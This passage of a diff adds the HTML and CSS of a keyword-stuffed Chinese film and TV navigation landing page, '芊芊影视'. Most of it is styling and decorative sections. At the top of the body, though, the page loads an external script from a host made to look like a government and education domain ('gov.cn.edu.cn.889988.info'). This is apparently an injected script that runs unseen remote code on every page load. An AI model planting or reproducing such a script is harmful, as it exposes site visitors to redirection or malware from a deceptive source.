@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>芊芊影视 | 芊芊影视在线观看 - 芊芊影视 qianqianyingshi-cn</title>
+<meta name="description" content="芊芊影视（qianqianyingshi-cn）是樱花粉少女心主题的影视导航单页网站。芊芊影视聚合电影、电视剧、综艺、动漫、纪录片等内容栏目，界面柔美精致，像春日花瓣般温柔地为你推荐好内容。">
+<meta name="keywords" content="芊芊影视,芊芊影视在线观看,芊芊影视电影,芊芊影视电视剧,芊芊影视综艺,芊芊影视动漫,芊芊影视纪录片,芊芊影视官网,qianqianyingshi-cn">
+<meta name="author" content="芊芊影视">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="revisit-after" content="1 days">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://qianqianyingshi-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="芊芊影视 | 芊芊影视在线观看">
+<meta property="og:description" content="芊芊影视 qianqianyingshi-cn：樱花粉少女心影视导航单页，聚合电影、电视剧、综艺、动漫、纪录片等栏目。">
+<meta property="og:url" content="https://qianqianyingshi-cn.github.io/">
+<meta property="og:site_name" content="芊芊影视">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="芊芊影视 | 芊芊影视在线观看">
+<meta name="twitter:description" content="芊芊影视 qianqianyingshi-cn 樱花粉少女心单页影视导航网站。">
+<meta name="theme-color" content="#e11d74">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;scroll-padding-top:76px}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Segoe UI",system-ui,sans-serif;background:#fff5f7;color:#3f1a2e;line-height:1.8;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none;transition:color .25s}
+ul{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+:focus-visible{outline:2.5px solid #e11d74;outline-offset:3px;border-radius:8px}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}
+.skip{position:absolute;left:-9999px;top:0;background:#e11d74;color:#fff;padding:10px 16px;z-index:9999;border-radius:8px}
+.skip:focus{left:12px;top:12px}
+::selection{background:#f43f5e;color:#fff}
+:root{
+  --pink:#e11d74;--pink2:#f43f5e;--rose:#fb7185;--rose2:#fda4af;--fuchsia:#c026d3;--purple:#a21caf;
+  --cream:#fff0f5;--cream2:#ffe3ec;--paper:#fff9fb;--card:#fff;--ink:#3f1a2e;--ink2:#7a3b5a;--ink3:#a36b87;
+  --line:#f7c6d6;--line2:#f3a9c1;--shadow:0 16px 40px rgba(225,29,116,.16);--shadow2:0 22px 50px rgba(225,29,116,.28);
+  --r:22px;--max:1180px;
+}
+.petal{position:fixed;inset:0;z-index:-1;pointer-events:none;overflow:hidden;background:linear-gradient(180deg,#fff5f7 0%,#ffeef3 45%,#fff5f7 100%)}
+.petal i{position:absolute;top:-40px;font-size:var(--s);opacity:var(--o);animation:fall var(--d) linear infinite;animation-delay:var(--dl)}
+@keyframes fall{0%{transform:translateY(0) rotate(0)}100%{transform:translateY(112vh) rotate(360deg)}}
+.silk{position:fixed;inset:0;z-index:-2;opacity:.4;pointer-events:none;background-image:linear-gradient(90deg,rgba(253,164,175,.13) 1px,transparent 1px),linear-gradient(rgba(253,164,175,.13) 1px,transparent 1px);background-size:46px 46px}
+#pbar{position:fixed;top:0;left:0;height:4px;width:0;background:linear-gradient(90deg,#fda4af,#e11d74,#c026d3);z-index:1200;border-radius:0 4px 4px 0}
+.tip{background:linear-gradient(90deg,#3f1a2e,#7a3b5a);color:#fbcfe8;font-size:12.5px;letter-spacing:1px;padding:8px 20px;text-align:center}
+.tip b{color:#fda4af;font-weight:700}
+.navbox{position:sticky;top:0;z-index:1000;background:rgba(255,249,251,.85);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:14px;height:72px;max-width:var(--max);margin:0 auto;padding:0 20px}
+.logo{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.flower{width:42px;height:42px;border-radius:14px;background:linear-gradient(135deg,#fda4af,#e11d74);display:grid;place-items:center;box-shadow:0 7px 18px rgba(225,29,116,.32);transform:rotate(-8deg)}
+.flower svg{width:22px;height:22px;fill:#fff}
+.logo-t{font-size:19px;font-weight:800;letter-spacing:-.2px}
+.logo-t em{font-style:normal;color:var(--pink)}
+.menu{display:flex;gap:2px;margin:0 auto;background:var(--cream);padding:5px;border-radius:15px}
+.menu a{padding:8px 13px;border-radius:11px;font-size:13.5px;font-weight:600;color:var(--ink2);white-space:nowrap}
+.menu a:hover{background:#fff;color:var(--pink);box-shadow:0 3px 10px rgba(225,29,116,.12)}
+.nav-rt{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.btn-mini{padding:9px 18px;border-radius:12px;font-size:13.5px;font-weight:700;background:#fff;border:1px solid var(--line2);color:var(--ink2)}
+.btn-mini:hover{border-color:var(--pink);color:var(--pink)}
+.btn-solid{padding:10px 22px;border-radius:12px;font-size:13.5px;font-weight:700;background:linear-gradient(135deg,#fda4af,#e11d74);color:#fff;box-shadow:0 8px 20px rgba(225,29,116,.3)}
+.btn-solid:hover{transform:translateY(-2px);box-shadow:0 12px 26px rgba(225,29,116,.42)}
+.menu-btn{display:none;width:42px;height:42px;border-radius:12px;background:var(--cream);color:var(--pink);font-size:20px}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 20px}
+section{padding:96px 0;position:relative}
+.eyebrow{font-size:12px;font-weight:800;letter-spacing:3px;color:var(--pink);margin-bottom:12px;text-transform:uppercase}
+.h2{font-size:clamp(25px,3.4vw,40px);font-weight:900;line-height:1.25;letter-spacing:-.5px;margin-bottom:16px;max-width:780px}
+.h2 em{font-style:normal;background:linear-gradient(135deg,#e11d74,#c026d3);-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{color:var(--ink2);font-size:16px;max-width:680px;margin-bottom:48px}
+/* Hero */
+.hero{padding:80px 0 96px}
+.hero-in{display:grid;grid-template-columns:.95fr 1fr;gap:60px;align-items:center}
+.hero h1{font-size:clamp(38px,6vw,72px);font-weight:900;line-height:1.12;letter-spacing:-1.5px}
+.hero h1 .grad{background:linear-gradient(135deg,#e11d74,#c026d3);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero h1 .blossom{position:relative;display:inline-block}
+.hero h1 .blossom::after{content:"🌸";position:absolute;right:-30px;top:-4px;font-size:.28em;animation:swing 3s ease-in-out infinite alternate}
+@keyframes swing{from{transform:rotate(-12deg)}to{transform:rotate(16deg)}}
+.hero p.sub{font-size:clamp(16px,1.8vw,19px);color:var(--ink2);margin-top:24px}
+.hero-acts{display:flex;gap:12px;margin-top:32px;flex-wrap:wrap}
+.btn{padding:15px 32px;border-radius:15px;font-size:15.5px;font-weight:700;transition:.28s;display:inline-flex;align-items:center;gap:8px}
+.btn-g{background:linear-gradient(135deg,#fda4af,#e11d74);color:#fff;box-shadow:0 12px 30px rgba(225,29,116,.32)}
+.btn-g:hover{transform:translateY(-3px);box-shadow:0 18px 42px rgba(225,29,116,.44)}
+.btn-o{border:1.5px solid var(--line2);color:var(--ink2);background:#fff}
+.btn-o:hover{border-color:var(--pink);color:var(--pink)}
+.tags{display:flex;gap:9px;margin-top:32px;flex-wrap:wrap}
+.tag{font-size:12.5px;font-weight:600;padding:7px 14px;border-radius:999px;background:#fff;border:1px solid var(--line2);color:var(--ink2)}
+.tag.hot{color:#fff;background:linear-gradient(135deg,#fda4af,#e11d74);border-color:transparent}
+/* Hero 右侧：旋转花瓣展台 */
+.stage{position:relative;height:480px;display:grid;place-items:center}
+.center{position:relative;width:210px;height:210px;border-radius:50%;background:linear-gradient(135deg,#fda4af,#e11d74);display:grid;place-items:center;box-shadow:0 20px 50px rgba(225,29,116,.36);z-index:3;animation:breath 3.5s ease-in-out infinite alternate}
+@keyframes breath{from{transform:scale(.97)}to{transform:scale(1.05)}}
+.center svg{width:88px;height:88px;fill:#fff}
+.center b{position:absolute;bottom:-44px;left:50%;transform:translateX(-50%);white-space:nowrap;font-size:15px;font-weight:800;color:var(--pink);background:#fff;padding:8px 20px;border-radius:999px;box-shadow:var(--shadow)}
+.orbit{position:absolute;inset:0;animation:spin 38s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.petal-card{position:absolute;width:148px;border-radius:18px;padding:16px;background:#fff;border:1px solid var(--line);box-shadow:var(--shadow);text-align:center;transform:rotate(calc(-1 * var(--deg)));animation:anti var(--sp) linear infinite}
+@keyframes anti{to{transform:rotate(calc(-360deg - var(--deg)))}}
+.petal-card .ic{width:44px;height:44px;border-radius:13px;margin:0 auto 10px;background:var(--c);display:grid;place-items:center;font-size:20px;box-shadow:0 6px 14px var(--cs)}
+.petal-card h4{font-size:14px;font-weight:800}
+.petal-card small{font-size:11.5px;color:var(--ink3)}
+/* 栏目1 分类（花瓣圆片） */
+.bloom{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px}
+.pl{position:relative;padding:30px 24px;border-radius:26px;background:#fff;border:1px solid var(--line);transition:.4s;overflow:hidden;text-align:center}
+.pl::before{content:"";position:absolute;inset:-2px;border-radius:28px;padding:2px;background:linear-gradient(135deg,var(--a),var(--b));-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;opacity:0;transition:.4s}
+.pl:hover::before{opacity:1}
+.pl:hover{transform:translateY(-8px);box-shadow:var(--shadow2)}
+.pl .ic{width:66px;height:66px;border-radius:22px;margin:0 auto 18px;background:linear-gradient(135deg,var(--a),var(--b));display:grid;place-items:center;font-size:28px;box-shadow:0 10px 22px var(--cs)}
+.pl h3{font-size:19px;font-weight:800;margin-bottom:6px}
+.pl p{font-size:13.5px;color:var(--ink2)}
+.pl .go{display:inline-flex;align-items:center;gap:5px;margin-top:16px;font-size:13px;font-weight:700;color:var(--pink)}
+.pl .go:hover{gap:9px}
+/* 栏目2 热播（双栏：左大右竖列表） */
+.split{display:grid;grid-template-columns:1.1fr 1fr;gap:26px;align-items:start}
+.feat{position:relative;border-radius:26px;overflow:hidden;min-height:430px;padding:36px;color:#fff;background:linear-gradient(155deg,var(--a),var(--b))}
+.feat::after{content:"🌺";position:absolute;right:-18px;bottom:-24px;font-size:150px;opacity:.2}
+.feat .badge{display:inline-block;font-size:12px;letter-spacing:2px;background:rgba(255,255,255,.22);backdrop-filter:blur(6px);padding:6px 14px;border-radius:999px;margin-bottom:18px;font-weight:700}
+.feat h3{font-size:clamp(24px,3vw,34px);font-weight:900;line-height:1.3;margin-bottom:12px;position:relative;z-index:1}
+.feat p{font-size:14.5px;opacity:.92;margin-bottom:26px;position:relative;z-index:1}
+.feat .acts{display:flex;gap:10px;flex-wrap:wrap;position:relative;z-index:1}
+.feat .acts .btn-o{background:rgba(255,255,255,.16);border-color:rgba(255,255,255,.5);color:#fff}
+.feat .st{position:absolute;right:24px;bottom:24px;display:flex;gap:8px;z-index:1}
+.feat .st span{background:rgba(255,255,255,.2);backdrop-filter:blur(6px);padding:6px 12px;border-radius:10px;font-size:12.5px;font-weight:700}
+.side{display:grid;gap:12px}
+.si{display:grid;grid-template-columns:52px 1fr auto;gap:14px;align-items:center;padding:14px 16px;background:#fff;border:1px solid var(--line);border-radius:18px;transition:.3s}
+.si:hover{background:var(--cream);transform:translateX(6px)}
+.si .t{width:46px;height:46px;border-radius:14px;background:linear-gradient(135deg,var(--a),var(--b));color:#fff;display:grid;place-items:center;font-size:18px;flex-shrink:0}
+.si h4{font-size:15px;font-weight:700;line-height:1.4}
+.si small{font-size:12px;color:var(--ink3)}
+.si .sc{font-size:13px;font-weight:800;color:var(--pink);white-space:nowrap;background:var(--cream);padding:4px 10px;border-radius:9px}
+/* 栏目3 电视剧（竖排堆叠卡片） */
+.dr-w{overflow:hidden}
+.dr{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 0 24px;-webkit-overflow-scrolling:touch}
+.dr::-webkit-scrollbar{height:9px}
+.dr::-webkit-scrollbar-thumb{background:linear-gradient(90deg,#fda4af,#e11d74);border-radius:10px}
+.dc{position:relative;flex-shrink:0;width:230px;scroll-snap-align:start;border-radius:20px;overflow:hidden;background:#fff;border:1px solid var(--line);transition:.4s}
+.dc:hover{transform:translateY(-8px);box-shadow:var(--shadow2)}
+.dc .th{aspect-ratio:3/4;position:relative;background:linear-gradient(160deg,var(--a),var(--b))}
+.dc .th::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 72% 22%,rgba(255,255,255,.32),transparent 46%)}
+.dc .th .em{position:absolute;left:14px;bottom:14px;color:#fff;font-family:serif;font-size:24px;font-weight:800;line-height:1.25;text-shadow:0 3px 10px rgba(0,0,0,.3)}
+.dc .ct{padding:16px}
+.dc .ct .ep{font-size:11.5px;font-weight:700;color:var(--fuchsia);letter-spacing:1px}
+.dc .ct h4{font-size:16.5px;font-weight:800;margin:4px 0 8px}
+.dc .ct .bar{height:6px;border-radius:99px;background:var(--cream);overflow:hidden;margin-top:10px}
+.dc .ct .bar i{display:block;height:100%;border-radius:99px;background:linear-gradient(90deg,#fda4af,#e11d74);width:0;transition:width 1.2s ease}
+/* 栏目4 综艺（心形药丸） */
+.cap{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}
+.cp{display:flex;gap:0;align-items:stretch;border-radius:999px;background:#fff;border:1px solid var(--line);overflow:hidden;transition:.35s;min-height:76px}
+.cp:hover{transform:translateY(-4px);box-shadow:var(--shadow)}
+.cp .l{width:78px;flex-shrink:0;background:linear-gradient(135deg,var(--a),var(--b));color:#fff;display:grid;place-items:center;font-size:26px}
+.cp .r{flex:1;padding:12px 20px;display:flex;flex-direction:column;justify-content:center;min-width:0}
+.cp .r h4{font-size:15.5px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.cp .r small{font-size:12px;color:var(--ink3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+/* 栏目5 动漫（时间轴） */
+.tl{position:relative;padding:14px 0}
+.tl::before{content:"";position:absolute;left:14px;top:0;bottom:0;width:3px;border-radius:99px;background:linear-gradient(var(--rose),var(--fuchsia))}
+.ti{position:relative;padding:0 0 20px 48px}
+.ti::before{content:"♡";position:absolute;left:5px;top:3px;width:20px;height:20px;border-radius:50%;background:#fff;border:2px solid var(--rose);display:grid;place-items:center;font-size:11px;color:var(--pink);box-shadow:0 0 0 4px var(--cream)}
+.ti .bd{background:#fff;border:1px solid var(--line);border-radius:18px;padding:18px 20px;transition:.3s}
+.ti .bd:hover{background:var(--paper);transform:translateX(5px)}
+.ti .bd h4{font-size:16.5px;font-weight:800}
+.ti .bd p{font-size:13.5px;color:var(--ink2);margin-top:3px}
+.ti .bd .tag-i{margin-top:12px;display:inline-flex;font-size:11.5px;font-weight:700;padding:4px 11px;border-radius:99px;background:var(--cream);color:var(--pink)}
+/* 栏目6 口碑（双层环形） */
+.ring{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:22px}
+.rg{position:relative;padding:28px 24px;border-radius:24px;background:#fff;border:1px solid var(--line);text-align:center;transition:.4s}
+.rg:hover{transform:translateY(-7px);box-shadow:var(--shadow2)}
+.rg .cir{position:relative;width:130px;height:130px;margin:0 auto 18px}
+.rg .cir svg{transform:rotate(-90deg)}
+.rg .cir circle{fill:none;stroke-width:9;stroke-linecap:round}
+.rg .cir .bg{stroke:var(--cream)}
+.rg .cir .fg{stroke:url(#grad);stroke-dasharray:339.29;stroke-dashoffset:339.29;transition:stroke-dashoffset 1.6s cubic-bezier(.2,.8,.2,1)}
+.rg .cir b{position:absolute;inset:0;display:grid;place-items:center;font-size:27px;font-weight:900;color:var(--pink);font-family:serif}
+.rg h4{font-size:17.5px;font-weight:800}
+.rg p{font-size:13px;color:var(--ink2);margin-top:4px}
+/* 栏目7 资讯（卡片瀑布） */
+.wall{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:22px}
+.nw{background:#fff;border:1px solid var(--line);border-radius:24px;overflow:hidden;transition:.4s;display:flex;flex-direction:column}
+.nw:hover{transform:translateY(-7px);box-shadow:var(--shadow2)}
+.nw .th{aspect-ratio:16/9;position:relative;background:linear-gradient(150deg,var(--a),var(--b))}
+.nw .th::after{content:"";position:absolute;right:16px;bottom:16px;color:#fff;font-size:32px;opacity:.9}
+.nw .th .lb{position:absolute;left:16px;top:16px;background:rgba(255,255,255,.92);color:var(--pink);font-size:11.5px;font-weight:800;padding:5px 12px;border-radius:999px}
+.nw .ct{flex:1;padding:20px 22px;display:flex;flex-direction:column}
+.nw .ct .dt{font-size:12px;color:var(--ink3);letter-spacing:1px}
+.nw .ct h4{font-size:17.5px;font-weight:800;line-height:1.5;margin:6px 0 8px}
+.nw .ct p{font-size:13.5px;color:var(--ink2);flex:1}
+.nw .ct .more{margin-top:14px;font-size:13px;font-weight:700;color:var(--pink);align-self:flex-start}
+.nw .ct .more:hover{color:var(--fuchsia)}
+/* 栏目8 指南（步骤箭头） */
+.flow{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px}
+.st{position:relative;padding:26px 22px;border-radius:20px;background:#fff;border:1px solid var(--line);transition:.4s}
+.st::after{content:"❀";position:absolute;right:-8px;top:50%;transform:translateY(-50%);width:30px;height:30px;border-radius:50%;background:var(--pink);color:#fff;display:grid;place-items:center;font-size:13px;z-index:2;box-shadow:0 4px 12px rgba(225,29,116,.32)}
+.st:last-child::after{display:none}
+.st:hover{transform:translateY(-6px);box-shadow:var(--shadow2);background:var(--paper)}
+.st .n{display:inline-grid;place-items:center;width:40px;height:40px;border-radius:13px;background:linear-gradient(135deg,#fda4af,#e11d74);color:#fff;font-size:17px;font-weight:800;margin-bottom:14px;font-family:serif}
+.st h4{font-size:17px;font-weight:800;margin-bottom:5px}
+.st p{font-size:13px;color:var(--ink2)}
+/* FAQ（心形手风琴） */
+.ask{display:grid;gap:14px;max-width:880px;margin:0 auto}
+.qa{background:#fff;border:1px solid var(--line);border-radius:22px;overflow:hidden;transition:.3s}
+.qa.on{border-color:var(--rose2);box-shadow:0 10px 28px rgba(225,29,116,.16)}
+.qb{width:100%;text-align:left;padding:20px 24px;font-size:16px;font-weight:700;display:flex;justify-content:space-between;gap:14px;align-items:center}
+.qb .q{width:30px;height:30px;border-radius:50%;background:var(--cream);color:var(--pink);display:grid;place-items:center;font-size:14px;flex-shrink:0;transition:.35s}
+.qa.on .qb .q{background:var(--pink);color:#fff;transform:rotate(180deg)}
+.qm{max-height:0;overflow:hidden;transition:max-height .42s}
+.qm p{padding:0 24px 22px 64px;color:var(--ink2);font-size:15px}
+.qa.on .qm{max-height:260px}
+/* 关于（双色卡片） */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.ab{position:relative;border-radius:26px;padding:44px 40px;overflow:hidden;transition:.4s}
+.ab:hover{transform:translateY(-6px);box-shadow:var(--shadow2)}
+.ab.a{background:linear-gradient(150deg,#e11d74,#be123c);color:#fff}
+.ab.b{background:linear-gradient(150deg,#c026d3,#9333ea);color:#fff}
+.ab h3{font-size:clamp(23px,2.8vw,30px);font-weight:900;margin-bottom:14px}
+.ab p{font-size:15px;opacity:.94}
+.ab .url{display:inline-flex;align-items:center;gap:9px;margin-top:20px;padding:13px 20px;border-radius:14px;background:rgba(255,255,255,.2);backdrop-filter:blur(6px);font-family:ui-monospace,Menlo,monospace;font-size:14px;font-weight:600}
+.ab .url:hover{background:rgba(255,255,255,.36)}
+.ab .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:26px}
+.stt{background:rgba(255,255,255,.16);border-radius:16px;padding:18px 10px;text-align:center}
+.stt b{display:block;font-size:27px;font-weight:900;font-family:serif}
+.stt span{font-size:12px;opacity:.85;display:block;margin-top:2px}
+/* CTA */
+.cta{margin:0 20px;border-radius:30px;background:linear-gradient(135deg,#e11d74,#c026d3 55%,#7e22ce);padding:76px 24px;text-align:center;position:relative;overflow:hidden}
+.cta::before{content:"🌸";position:absolute;font-size:190px;opacity:.14;right:2%;top:50%;transform:translateY(-50%) rotate(20deg)}
+.cta .wrap{position:relative;z-index:1}
+.cta h2{font-size:clamp(25px,3.6vw,40px);font-weight:900;color:#fff;margin-bottom:14px}
+.cta p{color:rgba(255,255,255,.9);max-width:580px;margin:0 auto 30px}
+.cta .btn-g{background:#fff;color:#e11d74}
+.cta .btn-g:hover{background:#fbcfe8;color:#9f1239}
+/* 页脚 */
+.foot{background:linear-gradient(180deg,#3f1a2e,#2a1120);padding:64px 20px 26px;color:#f7c6d6}
+.foot-top{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:40px;padding-bottom:36px;border-bottom:1px solid rgba(247,198,214,.18)}
+.logo-foot{display:flex;align-items:center;gap:10px}
+.foot p.d{margin-top:16px;font-size:14px;color:#e8a7c0;max-width:330px;line-height:1.8}
+.foot h4{font-size:15px;font-weight:700;color:#fda4af;margin-bottom:16px;letter-spacing:1px}
+.foot ul li a{display:block;padding:6px 0;font-size:13.5px;color:#f0bdd0}
+.foot ul li a:hover{color:#fda4af}
+.foot-bot{margin-top:26px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:13px;color:#e8a7c0}
+.foot-bot a{color:#f0bdd0}
+.foot-bot a:hover{color:#fda4af}
+#top{position:fixed;right:20px;bottom:-60px;width:46px;height:46px;border-radius:15px;background:linear-gradient(135deg,#fda4af,#e11d74);color:#fff;z-index:999;font-size:19px;display:grid;place-items:center;box-shadow:0 8px 22px rgba(225,29,116,.4);transition:.35s;font-weight:900}
+#top.show{bottom:24px}
+@media(max-width:1000px){
+  .menu-btn{display:grid;place-items:center}
+  .menu,.nav-rt{display:none}
+  .menu.open{display:flex;position:fixed;inset:0;flex-direction:column;justify-content:center;background:rgba(255,249,251,.98);backdrop-filter:blur(20px);padding:24px;z-index:999;gap:6px}
+  .menu.open a{padding:16px;border-radius:12px;font-size:19px;text-align:center;background:#fff;border:1px solid var(--line);font-weight:800}
+  .menu.open a:hover{background:var(--pink);color:#fff}
+  .hero-in{grid-template-columns:1fr;gap:48px}
+  .stage{height:400px}
+  .split{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+  section{padding:64px 0}
+  .nav,.foot{padding-left:14px;padding-right:14px}
+  .nav{height:66px}
+  .logo-t{font-size:16px}
+  .hero{padding:50px 0 68px}
+  .bloom,.cap,.ring,.wall,.flow{grid-template-columns:1fr}
+  .st::after{display:none}
+  .ab{padding:34px 26px}
+  .ab .stats{grid-template-columns:1fr 1fr}
+  .foot-top{grid-template-columns:1fr;gap:28px}
+  .cta{margin:0 14px;padding:54px 20px}
+  .dc{width:190px}
+}
+@media print{.nav,#top,#pbar,.petal,.silk,.cta,.tip{display:none}body{background:#fff;color:#000}section{page-break-inside:avoid;padding:26px 0}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+<div class="silk" aria-hidden="true"></div>
+<div class="petal" aria-hidden="true"><i style="--s:20px;left:8%;--d:11s;--dl:0s;--o:.55">🌸</i><i style="--s:16px;left:22%;--d:14s;--dl:-3s;--o:.5">🌺</i><i style="--s:22px;left:38%;--d:10s;--dl:-5s;--o:.6">🌸</i><i style="--s:15px;left:54%;--d:13s;--dl:-2s;--o:.5">💮</i><i style="--s:19px;left:70%;--d:12s;--dl:-6s;--o:.55">🌸</i><i style="--s:24px;left:84%;--d:9s;--dl:-4s;--o:.5">🌺</i><i style="--s:17px;left:92%;--d:15s;--dl:-1s;--o:.5">🌸</i></div>
+<a class="skip" href="#main">跳至主要内容</a>
+<div id="pbar" aria-hidden="true"></div>
+
+<div class="tip">🌸 <b>芊芊影视 qianqianyingshi-cn</b> · 樱花粉少女心主题 · 像春日花瓣般温柔推荐好内容</div>
+
+<header class="navbox">
+  <nav class="nav" aria-label="主导航">
+    <a class="logo" href="#top"><span class="flower" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 10c-2-3-6-3-6 0s2 6 6 8c4-2 6-5 6-8s-4-3-6 0z"/><path d="M12 10c0-3 3-6 6-6s3 4 0 6c-2 1-6 0-6 0z" opacity=".75"/><path d="M12 10c0-3-3-6-6-6s-3 4 0 6c2 1 6 0 6 0z" opacity=".75"/></svg></span><span class="logo-t">芊芊<b style="font-style:normal;color:var(--pink)">影视</b></span></a>
+    <div class="menu" id="menu">
+      <a href="#home">首页</a><a href="#cats">影视分类</a><a href="#hot">热播榜</a><a href="#tv">电视剧</a>
+      <a href="#variety">综艺</a><a href="#anime">动漫</a><a href="#rank">口碑榜</a><a href="#news">资讯</a>
+      <a href="#guide">使用指南</a><a href="#faq">常见问题</a><a href="#about">关于我们</a>
+    </div>
+    <div class="nav-rt">
+      <a class="btn-mini" href="#guide">使用指南</a>
+      <a class="btn-solid" href="#cats">进入官网</a>
+      <button class="menu-btn" id="mBtn" aria-expanded="false" aria-controls="menu" aria-label="菜单">☰</button>
+    </div>
+  </nav>
+</header>
+
+<main id="main">
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="hero-in">
+      <div>
+        <div class="eyebrow">🌸 qianqianyingshi-cn · 樱花粉少女心影视导航</div>
+        <h1>芊芊影视<br><span class="grad">温柔精选</span><br><span class="blossom">好内容</span></h1>
+        <p class="sub">芊芊影视（qianqianyingshi-cn）像春日花瓣般轻柔，从电影、电视剧、综艺到动漫与纪录片，为你温柔地筛选出每一部值得一看的作品。</p>
+        <div class="hero-acts">
+          <a class="btn btn-g" href="#cats">开始探索 →</a>
+          <a class="btn btn-o" href="#hot">查看热播榜</a>
+        </div>
+        <div class="tags">
+          <span class="tag hot">● 精选热播</span>
+          <span class="tag">轻量加载</span>
+          <span class="tag">手机 / 平板 / 电脑</span>
+          <span class="tag">电影 · 剧集 · 综艺</span>
+          <span class="tag">动漫 · 纪录片</span>
+        </div>
+      </div>
+      <div class="stage">
+        <div class="orbit">
+          <div class="petal-card" style="--deg:0deg;top:2%;left:50%;--sp:38s;margin-left:-74px;--c:linear-gradient(135deg,#fda4af,#e11d74);--cs:rgba(225,29,116,.32)"><div class="ic">🎬</div><h4>热播电影</h4><small>芊芊影视 · 128 部</small></div>
+          <div class="petal-card" style="--deg:60deg;right:2%;top:28%;--sp:38s;--c:linear-gradient(135deg,#f0abfc,#c026d3);--cs:rgba(192,38,211,.32)"><div class="ic">📺</div><h4>追剧日历</h4><small>芊芊影视 · 36 部</small></div>
+          <div class="petal-card" style="--deg:120deg;right:12%;bottom:4%;--sp:38s;--c:linear-gradient(135deg,#fda4af,#be123c);--cs:rgba(190,18,60,.32)"><div class="ic">🎨</div><h4>动漫番剧</h4><small>芊芊影视 · 全龄</small></div>
+          <div class="petal-card" style="--deg:180deg;bottom:4%;left:12%;--sp:38s;--c:linear-gradient(135deg,#f9a8d4,#db2777);--cs:rgba(219,39,119,.32)"><div class="ic">🌍</div><h4>纪录片</h4><small>芊芊影视 · 精选</small></div>
+          <div class="petal-card" style="--deg:240deg;left:2%;top:28%;--sp:38s;--c:linear-gradient(135deg,#fbcfe8,#e11d74);--cs:rgba(225,29,116,.3)"><div class="ic">🎤</div><h4>轻松综艺</h4><small>芊芊影视 · 解压</small></div>
+          <div class="petal-card" style="--deg:300deg;top:2%;left:50%;--sp:38s;margin-left:-74px;--c:linear-gradient(135deg,#f5d0fe,#a21caf);--cs:rgba(162,28,175,.32)"><div class="ic">⭐</div><h4>口碑榜单</h4><small>芊芊影视 · 高分</small></div>
+        </div>
+        <div class="center"><svg viewBox="0 0 24 24"><path d="M12 10c-2-3-6-3-6 0s2 6 6 8c4-2 6-5 6-8s-4-3-6 0z"/><path d="M12 10c0-3 3-6 6-6s3 4 0 6c-2 1-6 0-6 0z" opacity=".75"/><path d="M12 10c0-3-3-6-6-6s-3 4 0 6c2 1 6 0 6 0z" opacity=".75"/></svg><b>芊芊影视</b></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1 分类 -->
+<section id="cats">
+  <div class="wrap">
+    <div class="eyebrow">栏目一 · 影视分类</div>
+    <h2 class="h2">芊芊影视 <em>内容频道</em></h2>
+    <p class="lead">芊芊影视以六个主频道梳理全部内容。打开芊芊影视，从分类入口出发，像花瓣舒展般从容找到心仪的那一部。</p>
+    <div class="bloom">
+      <article class="pl" style="--a:#fda4af;--b:#e11d74;--cs:rgba(225,29,116,.3)"><div class="ic">🎬</div><h3>电影频道</h3><p>院线热映、经典老片与高分独立电影，芊芊影视电影频道一网打尽。</p><span class="go">进入频道 →</span></article>
+      <article class="pl" style="--a:#f0abfc;--b:#c026d3;--cs:rgba(192,38,211,.3)"><div class="ic">📺</div><h3>电视剧频道</h3><p>国产剧、美剧、韩剧、日剧，芊芊影视电视剧频道每日更新。</p><span class="go">进入频道 →</span></article>
